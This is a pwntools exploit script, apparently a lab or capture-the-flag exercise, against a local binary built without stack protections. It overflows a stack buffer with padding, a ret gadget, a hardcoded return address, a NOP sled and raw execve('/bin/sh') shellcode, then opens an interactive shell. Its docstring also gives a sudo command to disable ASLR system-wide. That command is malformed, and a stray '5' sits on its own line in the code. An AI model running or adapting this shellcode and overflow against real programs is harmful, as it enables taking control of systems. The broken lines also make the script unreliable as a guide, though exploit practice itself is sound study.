#!/usr/bin/env python3

"""
Stack:      No canary found
NX:         NX disabled
PIE:        No PIE
ASLR:       Disabled  

Disable ASLR using the following command : 
    echo 0; sudo tee /proc/sys/kernel/randomize-va-space

The exploit involves writing shellcode onto the stack and then redirecting the program's execution flow to an address within the stack.
The crafted payload places a sequence of NOP (No Operation) instructions before the shellcode, ensuring a "NOP sled" that guides execution 
smoothly into the shellcode. As the program begins executing instructions from the stack, it traverses the NOP sled and eventually executes 
the embedded shellcode.
"""

from pwn import *

context(os="linux", arch="amd64")

bin = context.binary = ELF("./vuln.o")
bin_rop = ROP("./vuln.o")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        context.terminal = ["gnome-terminal", "--"]
        return gdb.debug([bin.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([bin.path] + argv, *a, **kw)


gdbscript = """
b main
continue
""".format(
    **locals()
)

io = start()
5
junk = b"a" * 0x108

ret_gadget = bin_rop.find_gadget(["ret"])[0]

ret = 0x7FFFFFFFDC28

nop = b"\x90" * 100

# shellcode = asm(shellcraft.sh())
# shellcode = b"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

payload = junk + pack(ret_gadget) + pack(ret) + nop + shellcode

io.sendline(payload)

io.interactive()
